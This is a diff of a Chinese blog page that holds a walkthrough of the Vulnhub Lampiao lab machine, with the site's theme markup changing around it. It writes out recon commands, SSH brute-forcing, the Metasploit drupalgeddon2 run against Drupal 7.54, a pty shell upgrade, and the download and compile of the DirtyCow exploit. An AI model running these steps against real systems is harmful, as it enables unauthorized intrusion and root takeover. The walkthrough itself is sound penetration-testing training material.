@@ -1,437 +1,240 @@
+
+
 <!DOCTYPE html>
+<html lang="zh-Hans" data-default-color-scheme=&#34;auto&#34;>
 
 
 
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="Talk is cheap, show me writeup
+
+用到的工具与知识
+nmap、hydra、cewl、whatweb、metasploit、脏牛提权
+
+靶机下载">
+  <meta name="author" content="Shawn">
+  <meta name="keywords" content="">
+  
+  <title>Vulnhub Lampiao writeup - P3aceSh4wn&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
 
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
   
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Vulnhub," />
-
-
-
-
-  
-
-
-  <link rel="alternate" href="/atom.xml" title="P3aceSh4wn's blog" type="application/atom+xml" />
-
-
-
-
-
-
-<meta name="description" content="Talk is cheap, show me writeup  用到的工具与知识 nmap、hydra、cewl、whatweb、metasploit、脏牛提权  靶机下载">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub Lampiao writeup">
-<meta property="og:url" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/index.html">
-<meta property="og:site_name" content="P3aceSh4wn&#39;s blog">
-<meta property="og:description" content="Talk is cheap, show me writeup  用到的工具与知识 nmap、hydra、cewl、whatweb、metasploit、脏牛提权  靶机下载">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/2.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/3.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/4.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/5.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/6.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/7.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/8.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/9.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/12.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/10.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/11.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/13.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/14.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/15.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/16.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/17.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/18.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/lampiao.jpg">
-<meta property="article:published_time" content="2020-03-07T15:02:21.000Z">
-<meta property="article:modified_time" content="2020-03-10T03:09:28.336Z">
-<meta property="article:author" content="Shawn">
-<meta property="article:tag" content="Vulnhub">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/1.png">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/"/>
-
-
-
-
-
-  <title>Vulnhub Lampiao writeup | P3aceSh4wn's blog</title>
-  
-
-
-
-
-
-
-
-
-<meta name="generator" content="Hexo 4.2.0"></head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
- 
- 
- <link rel="stylesheet" href="/dist/APlayer.min.css">
-<div id="aplayer"></div>
-<script type="text/javascript" src="/dist/APlayer.min.js"></script>
-<script type="text/javascript" src="/dist/music.js"></script>
- 
-  
-  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">P3aceSh4wn's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
 
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="P3aceSh4wn's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
-  </div>
-</div>
 
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-
-      
-        <li class="menu-item menu-item-search">
           
-            <a href="javascript:;" class="popup-trigger">
           
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
-        </li>
-      
-    </ul>
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/07/Vulnhub-Lampiao-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shawn">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P3aceSh4wn's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">Vulnhub Lampiao writeup</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-07T23:02:21+08:00">
-                2020-03-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index">
-                    <span itemprop="name">打靶</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest-training/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest training</span>
-                  </a>
-                </span>
-
-                
-                
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Vulnhub Lampiao writeup">
               
             </span>
-          
 
-          
             
-          
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-07 23:02" pubdate>
+        March 7, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      960 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
 
           
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-file-o">></i>
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p><strong>Talk is cheap, show me writeup</strong></p>
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Vulnhub Lampiao writeup</h1>
+            
+            <div class="markdown-body">
+              <p><strong>Talk is cheap, show me writeup</strong></p>
 <blockquote>
 <p><strong>用到的工具与知识</strong></p>
 <p>nmap、hydra、cewl、whatweb、metasploit、脏牛提权</p>
@@ -440,56 +243,56 @@
 <a id="more"></a>
 
 <h2 id="0x01-情报搜集"><a href="#0x01-情报搜集" class="headerlink" title="0x01 情报搜集"></a>0x01 情报搜集</h2><p>nmap刺探一下信息</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/1.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/1.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>可以看到开启了22/ssh，80/http，1898/http，三个端口，看到ssh可以想到ssh爆破。</p>
 <p>先往下，我们先进一步搜集信息，不贸然出动</p>
 <p>用浏览器访问一下网站相应端口</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/2.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/2.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>一个船长的人头？我喜欢，我们再看看别的端口</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/3.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/3.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>嗯，一个不错的Drupal CMS，仔细观察之后发现两个用户，再看一眼文章内容</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/4.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/4.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>我把文章页面的内容用<code>cewl</code>抓下来做成字典，再加上之前的用户名我们用来爆破ssh</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/5.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/5.png" srcset="/img/loading.gif" lazyload alt></p>
 <p><strong>小插曲：</strong></p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/6.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/6.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>有够幸运（因为这靶机一般不可能是用爆破来解），我们爆破出来了一个ssh账户密码，登一下试试，直接拿到了一个低权限的账户。</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/7.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/7.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>经过一番长时间的试错，我们从众多exp中找到了能用的DirtyCow（脏牛提权），原理是直接将密码算法逆向解密，所以跑起来很快。上传文件（我用的MobaXterm）之后，按照exp内的提示在靶机上编译运行</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/8.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/8.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>成功提权，拿到flag</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/9.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/9.png" srcset="/img/loading.gif" lazyload alt></p>
 <p><strong>回归正常流程：</strong></p>
 <p>从CMS进一步获取信息，服务器等中间件的信息可以使用whatweb</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/12.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/12.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>路径、敏感文件、指纹什么的，我会用Nikto、dirburster、dirb</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/10.png" alt></p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/11.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/10.png" srcset="/img/loading.gif" lazyload alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/11.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>由上面找到的信息，进一步查看robots.txt</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/13.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/13.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>发现能够看CHANGELOG.txt，这个文件一般会包含详细版本号，以及大量修改信息</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/14.png" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/14.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>果然，可以看到详细版本号是<code>Drupal 7.54</code></p>
 <h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>看到CMS我就忍不住想测试一下逻辑漏洞、XSS和SQL注入。结果发现创建不了用户，密码找回和SQL注入也相继失败，那么我只好从exploit-db找找有没有相应的drupal漏洞了。</p>
 <p>嗯，用rb的exp得到一个fake shell，路径都无法变更。。。</p>
 <p>又是一番试错，我们打开了msf，<code>search drupal 7.54</code>，自然选择时间靠后的exp</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Drupal Drupalgeddon 2 Forms API Property Injection</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Drupal Drupalgeddon 2 Forms API Property Injection<br></code></pre></td></tr></table></figure>
 
 <p>显示参数有什么需要填写，填写相应参数</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/15.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhost 192.168.206.138 # 设置攻击主机</span><br><span class="line">set rport 1898 # 设置攻击端口</span><br><span class="line">exploit # 进行攻击</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/15.png" srcset="/img/loading.gif" lazyload alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">show options<br>set rhost 192.168.206.138 # 设置攻击主机<br>set rport 1898 # 设置攻击端口<br>exploit # 进行攻击<br></code></pre></td></tr></table></figure>
 
 <p>成功拿到meterpreter，进入目标机的shell，我看看基本信息</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/16.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell # 进入目标机的shell</span><br><span class="line">uname -a # 显示操作系统版本信息</span><br><span class="line">id # 获取当前用户信息</span><br><span class="line">cat /etc/issue # 获取当前版本信息</span><br><span class="line">python -c "import pty;pty.spawn('/bin/bash');" # 拿python交互shell</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/16.png" srcset="/img/loading.gif" lazyload alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell # 进入目标机的shell<br>uname -a # 显示操作系统版本信息<br>id # 获取当前用户信息<br>cat /etc/issue # 获取当前版本信息<br>python -c "import pty;pty.spawn('/bin/bash');" # 拿python交互shell<br></code></pre></td></tr></table></figure>
 
 <p>OK！到这一步我就直接用之前的脏牛提权解决问题</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40847 # 下载exp</span><br><span class="line">mv 40847 40847.cpp # 更改文件名</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil # 编译</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解释一下编译的各个参数</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -Wall 允许发出GCC能提供的所有有用警告</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -pedantic 允许发出ANSI/ISO C标准列出的所有警告</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -O2 编译器优化的四个级别，0没有优化，1为缺省值，3为最高</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -std=c++11 用c++11标准编译</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -pthread Linux中用到多线程时，需要链接pthread库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># -o dcow 生成目标文件，命名为dcow</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://www.exploit-db.com/download/40847 # 下载exp<br>mv 40847 40847.cpp # 更改文件名<br>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil # 编译<br><span class="hljs-meta"><br>#</span><span class="bash"> 解释一下编译的各个参数</span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -Wall 允许发出GCC能提供的所有有用警告</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -pedantic 允许发出ANSI/ISO C标准列出的所有警告</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -O2 编译器优化的四个级别，0没有优化，1为缺省值，3为最高</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -std=c++11 用c++11标准编译</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -pthread Linux中用到多线程时，需要链接pthread库</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># -o dcow 生成目标文件，命名为dcow</span></span><br></code></pre></td></tr></table></figure>
 
-<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/17.png" alt></p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/18.png" alt></p>
+<h2 id="0x03-提权-amp-GetFlag"><a href="#0x03-提权-amp-GetFlag" class="headerlink" title="0x03 提权&amp;GetFlag"></a>0x03 提权&amp;GetFlag</h2><p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/17.png" srcset="/img/loading.gif" lazyload alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/18.png" srcset="/img/loading.gif" lazyload alt></p>
 <p>发现一张帅图，你好，船长！（虽然是寨主）</p>
-<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/lampiao.jpg" alt></p>
+<p><img src="/2020/03/07/Vulnhub-Lampiao-writeup/lampiao.jpg" srcset="/img/loading.gif" lazyload alt></p>
 <h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul>
 <li>除了走正常的流程，试错也很关键，在获取足够信息的基础上尽可能缩小试错的范围，同时试错也不要一根筋，掉到兔子洞里去，不时转换一下思路or休息一会都可能有不同程度的帮助</li>
 <li>工具和信息搜集的熟悉程度决定了后面的攻击效果</li>
@@ -498,397 +301,154 @@
 <p><a href="https://resources.infosecinstitute.com/lampiao-1-ctf-walkthrough/#gref" target="_blank" rel="noopener">Lampiao：CTF WalkThrough</a></p>
 <p><a href="https://jgeek.cn/archive/id/23.html" target="_blank" rel="noopener">Lampiao1 渗透测试</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2020/03/05/Vulnhub-DC-1-Writeup/" rel="next" title="Vulnhub DC-1 Writeup">
-                <i class="fa fa-chevron-left"></i> Vulnhub DC-1 Writeup
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
